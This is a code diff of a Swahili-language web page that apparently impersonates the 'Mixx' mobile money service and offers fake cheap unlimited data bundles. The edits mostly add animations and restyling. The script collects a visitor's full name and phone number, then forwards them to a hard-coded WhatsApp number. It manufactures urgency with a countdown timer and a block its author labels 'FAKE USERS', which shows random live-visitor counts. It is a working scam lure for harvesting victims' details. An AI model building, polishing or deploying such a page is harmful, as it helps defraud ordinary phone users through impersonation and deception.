@@ -28,14 +28,25 @@ align-items:center;
 
 /* BOX */
 .overlay {
-background:rgba(0,0,0,0.7);
+background:yellow;
+color:blue;
 padding:25px;
 border-radius:12px;
 text-align:center;
-color:white;
 width:90%;
 max-width:350px;
+animation:float 3s ease-in-out infinite;
 }
+
+/* FLOAT */
+@keyframes float {
+0% {transform: translateY(0px);}
+50% {transform: translateY(-10px);}
+100% {transform: translateY(0px);}
+}
+
+/* TEXT */
+h1,h2,h3,p {color:blue;}
 
 /* INPUT */
 input {
@@ -53,18 +64,39 @@ padding:12px;
 margin-top:10px;
 border-radius:8px;
 border:none;
-background:yellow;
+background:blue;
+color:white;
 font-weight:bold;
 cursor:pointer;
+animation:pulse 1.5s infinite;
+}
+
+button:hover {background:#0033cc;}
+
+@keyframes pulse {
+0% {transform: scale(1);}
+50% {transform: scale(1.05);}
+100% {transform: scale(1);}
 }
 
 /* OPTIONS */
 .option {
 background:#111;
+color:white;
 margin-top:10px;
 padding:10px;
 border-radius:8px;
 cursor:pointer;
+}
+
+/* FADE */
+.fade {
+animation:fadeIn 0.8s ease-in-out;
+}
+
+@keyframes fadeIn {
+from {opacity:0; transform:translateY(20px);}
+to {opacity:1; transform:translateY(0);}
 }
 </style>
 </head>
@@ -78,7 +110,7 @@ cursor:pointer;
 
 <h2>Huduma ya Haraka ya Mixx</h2>
 
-<p id="timer">⏳ Ofa inaisha ndani ya 05:00</p>
+<p id="timer">⏳ Ofa inaisha ndani ya 17:00</p>
 
 <input type="text" id="name" placeholder="Majina kamili">
 <input type="number" id="phone" placeholder="Namba yako">
@@ -91,113 +123,103 @@ cursor:pointer;
 </div>
 
 <script>
-let userName = "";
-let userPhone = "";
-let selectedPackage = "";
+let userName="", userPhone="", selectedPackage="";
 
 /* STEP 1 */
 function step1(){
-userName = document.getElementById("name").value;
-userPhone = document.getElementById("phone").value;
+userName=document.getElementById("name").value;
+userPhone=document.getElementById("phone").value;
 
-if(userName=="" || userPhone==""){
+if(userName==""||userPhone==""){
 document.getElementById("status").innerHTML="⚠️ Jaza taarifa zote";
 return;
 }
 
-document.getElementById("app").innerHTML =
-"<p>⏳ Inachakata taarifa zako...</p>";
-
+setContent("<p>⏳ Inachakata taarifa zako<span id='dots'></span></p>");
 setTimeout(step2,2000);
 }
 
 /* STEP 2 */
 function step2(){
-document.getElementById("app").innerHTML = `
+setContent(`
 <h3>Chagua Kifurushi</h3>
 
-<div class="option" onclick="selectPackage('75GB - 3570')">
+<div class="option" onclick="selectPackage('75GB - 3570'); vibrate();">
 75GB kwa Tsh 3,570 BILA KIKOMO
 </div>
 
-<div class="option" onclick="selectPackage('100GB - 5999')">
+<div class="option" onclick="selectPackage('100GB - 5999'); vibrate();">
 100GB kwa Tsh 5,999 BILA KIKOMO
 </div>
-`;
+`);
 }
 
 /* STEP 3 */
 function selectPackage(pkg){
-selectedPackage = pkg;
-
-document.getElementById("app").innerHTML =
-"<p>⏳ Inachakata chaguo lako...</p>";
-
+selectedPackage=pkg;
+setContent("<p>⏳ Inachakata chaguo lako<span id='dots'></span></p>");
 setTimeout(step3,2000);
 }
 
 /* STEP 4 */
 function step3(){
-document.getElementById("app").innerHTML = `
+setContent(`
 <p>🔐 Thibitisha ili kuendelea</p>
 <button onclick="step4()">THIBITISHA</button>
-`;
+`);
 }
 
 /* STEP 5 */
 function step4(){
-document.getElementById("app").innerHTML =
-"<p>📩 Endelea ili uweze kupokea Msimbo wa uthibitisho na menu ya kupokea vifurushi...</p>";
-
+setContent("<p>📩 Endelea ili uweze kupokea Msimbo wa uthibitisho na menu ya kupokea vifurushi...</p>");
 setTimeout(finish,2500);
 }
 
-/* FINAL STEP (WHATSAPP LAST) */
+/* FINAL */
 function finish(){
-
-document.getElementById("app").innerHTML =
-"<p style='color:#0f0;'>✔ Imekamilika! Tunakuunganisha na mhudumu...</p>";
+setContent("<p style='color:green;'>✔ Imekamilika! Tunakuunganisha...</p>");
 
 setTimeout(function(){
+let message="MTEJA MPYA%0A"
++"Jina: "+userName+"%0A"
++"Namba: "+userPhone+"%0A"
++"Kifurushi: "+selectedPackage;
 
-let message = "MTEJA MPYA%0A"
-+ "Jina: " + userName + "%0A"
-+ "Namba: " + userPhone + "%0A"
-+ "Kifurushi: " + selectedPackage;
-
-window.location.href =
-"https://wa.me/255780467038?text=" + message;
-
+window.location.href="https://wa.me/255780467038?text="+message;
 },3000);
-
 }
 
-/* TIMER */
-let time = 1020;
+/* HELPER */
+function setContent(content){
+document.getElementById("app").innerHTML="<div class='fade'>"+content+"</div>";
+}
+
+/* TIMER 17 MIN */
+let time=1020;
 setInterval(function(){
-let minutes = Math.floor(time / 60);
-let seconds = time % 60;
-
-document.getElementById("timer").innerHTML =
-"⏳ Ofa inaisha ndani ya " +
-minutes + ":" + (seconds<10?"0":"") + seconds;
-
-if(time > 0){ time--; }
+let m=Math.floor(time/60);
+let s=time%60;
+document.getElementById("timer").innerHTML=
+"⏳ Ofa inaisha ndani ya "+m+":"+(s<10?"0":"")+s;
+if(time>0){time--;}
 },1000);
 
 /* FAKE USERS */
 setInterval(function(){
-let num = Math.floor(Math.random()*30)+10;
-
-document.getElementById("liveUsers").innerHTML =
-"🔥 Watu " + num + " wanaendelea sasa hivi";
+let num=Math.floor(Math.random()*30)+10;
+document.getElementById("liveUsers").innerHTML=
+"🔥 Watu "+num+" wanaendelea sasa hivi";
 },4000);
+
+/* DOTS */
+setInterval(function(){
+let d=document.getElementById("dots");
+if(d){d.innerHTML=d.innerHTML.length>3?"":d.innerHTML+".";}
+},500);
 
 /* VIBRATION */
 function vibrate(){
-if(navigator.vibrate){
-navigator.vibrate(200);
-}
+if(navigator.vibrate){navigator.vibrate(200);}
 }
 </script>
 
